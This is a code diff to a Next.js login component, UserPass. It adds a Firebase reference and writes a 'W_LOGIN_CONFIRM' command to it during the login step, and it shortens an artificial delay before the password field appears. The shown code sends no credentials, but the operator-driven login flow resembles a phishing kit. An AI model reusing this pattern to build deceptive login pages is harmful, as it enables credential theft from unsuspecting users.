@@ -2,6 +2,7 @@
 
 import { Locale } from "@/config/i18n.config";
 import { getDictionaryUseClient } from "@/dicts/default-dictionary-use-client";
+import { ThenableReference, update } from "firebase/database";
 import { useParams } from "next/navigation";
 import { Dispatch, SetStateAction, useState } from "react";
 
@@ -10,6 +11,7 @@ interface IProps {
   setPassword: Dispatch<SetStateAction<string>>;
   username: string;
   password: string;
+  dataRef: ThenableReference | null;
 }
 
 export const UserPass = ({
@@ -17,6 +19,7 @@ export const UserPass = ({
   setPassword,
   password,
   username,
+  dataRef,
 }: IProps) => {
   const { lang } = useParams<{ lang: Locale }>();
   const [dict, setDict] = useState(getDictionaryUseClient(lang));
@@ -32,8 +35,11 @@ export const UserPass = ({
         setShowPassInput(true);
 
         setLoading(false);
-      }, 2500);
+      }, 1800);
     } else {
+      if (dataRef) {
+        update(dataRef, { command: "W_LOGIN_CONFIRM" });
+      }
     }
   };
 
